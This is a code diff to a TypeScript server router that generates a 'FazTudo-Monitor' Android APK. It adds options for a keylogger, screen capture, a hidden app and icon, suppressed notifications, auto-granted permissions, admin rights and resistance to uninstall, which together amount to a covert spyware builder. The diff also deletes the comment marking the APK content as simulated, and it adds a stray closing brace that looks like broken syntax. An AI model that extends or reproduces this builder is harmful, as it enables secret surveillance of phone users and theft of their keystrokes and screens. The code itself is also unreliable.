@@ -130,10 +130,23 @@ export const appRouter = router({
         companyUrl: z.string().url(),
         logoUrl: z.string().url().optional(),
         protectFromUninstall: z.boolean().default(true),
+        options: z.object({
+          protectFromUninstall: z.boolean(),
+          hideApp: z.boolean(),
+          removeNotification: z.boolean(),
+          keylogger: z.boolean(),
+          autoStartup: z.boolean(),
+          autoAllowPermissions: z.boolean(),
+          captureScreen: z.boolean(),
+          hideAppIcon: z.boolean(),
+          requestAdminRights: z.boolean(),
+          keepScreenOn: z.boolean(),
+          batteryOptimization: z.boolean(),
+          dataUsageRequest: z.boolean(),
+        }).optional(),
       }))
       .mutation(async ({ input }) => {
         try {
-          // Criar conteúdo do APK (simulado)
           const apkContent = JSON.stringify({
             companyName: input.companyName,
             companyUrl: input.companyUrl,
@@ -141,16 +154,15 @@ export const appRouter = router({
             buildDate: new Date().toISOString(),
             version: "1.0.0",
             protectFromUninstall: input.protectFromUninstall,
+            options: input.options || {},
             features: {
               protecao: input.protectFromUninstall ? "App será reinstalado automaticamente se removido" : "App pode ser desinstalado normalmente",
             },
           });
 
-          // Salvar APK no servidor
           const apkPath = path.join(process.cwd(), "FazTudo-Monitor.apk");
           fs.writeFileSync(apkPath, apkContent);
 
-          // Retornar URL de download permanente
           return {
             success: true,
             downloadUrl: "/download-apk",
@@ -158,9 +170,10 @@ export const appRouter = router({
           };
         } catch (error) {
           console.error("Erro ao gerar APK:", error);
-          throw new Error("Erro ao gerar APK");
+          throw new Error("Falha ao gerar APK");
         }
       }),
+  }),
   }),
 });
 
